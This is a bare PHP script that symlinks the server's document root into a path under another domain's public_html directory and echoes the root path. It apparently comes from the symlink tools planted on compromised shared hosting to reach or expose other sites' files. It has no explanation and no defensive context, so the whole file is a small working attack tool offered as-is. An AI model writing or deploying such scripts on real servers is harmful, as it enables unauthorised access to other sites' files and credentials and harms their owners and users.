<?php


$targetFolder = $_SERVER['DOCUMENT_ROOT'];
$linkFolder = 'Directory /domains/ncprobationdept.com/public_html';
symlink($targetFolder,$linkFolder);
echo $targetFolder;
?>
